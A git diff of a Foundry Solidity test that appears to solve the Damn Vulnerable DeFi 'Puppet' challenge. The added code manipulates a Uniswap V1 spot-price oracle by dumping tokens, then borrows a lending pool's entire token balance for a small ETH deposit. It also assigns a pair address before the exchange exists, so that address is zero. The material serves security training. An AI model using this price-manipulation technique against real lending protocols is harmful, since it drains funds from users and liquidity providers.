@@ -36,6 +36,8 @@ contract Puppet is Test {
     uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
     uint256 internal constant DEADLINE = 10_000_000;
 
+    address public uniswapPair;
+
     UniswapV1Exchange internal uniswapV1ExchangeTemplate;
     UniswapV1Exchange internal uniswapExchange;
     UniswapV1Factory internal uniswapV1Factory;
@@ -63,6 +65,7 @@ contract Puppet is Test {
 
         // Deploy factory, initializing it with the address of the template exchange
         uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
+        uniswapPair = address(uniswapExchange);
 
         uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(dvt)));
 
@@ -100,6 +103,29 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+
+        // 1. perform swap tokens for eth and approve uniswap exchange
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), 100_000e18);
+        uint256 ethAmount = uniswapExchange.tokenToEthSwapInput(1000 * 1e18, 9, block.timestamp + 1000);
+        // 2. chech oracle price from puppet pool
+        uint256 oraclePrice = puppetPool._computeOraclePrice();
+        console.log(unicode"oracle price: %s", oraclePrice);
+        // 3. console log attacker eth balance
+        console.log(unicode"attacker eth balance: %s", attacker.balance);
+        // 4. transfer dvt to uniswap exchange
+        // dvt.transfer(address(uniswapExchange), dvt.balanceOf(attacker));
+        // 5. calculate how much eth attacker need to deposit
+        uint256 ethAmountFromPool = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(unicode"eth amount to deposit to pool: %s", ethAmountFromPool);
+        // 6. check ethAmountFromPool should be less than attacker balance
+        assertLt(ethAmountFromPool, attacker.balance);
+        // 7. borrow from puppet pool and send eth with it
+
+        puppetPool.borrow{value: ethAmountFromPool}(dvt.balanceOf(address(puppetPool)));
+        // 8. check attacker token balance
+        console.log(unicode"attacker token balance: %s", dvt.balanceOf(attacker) / 1e18);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
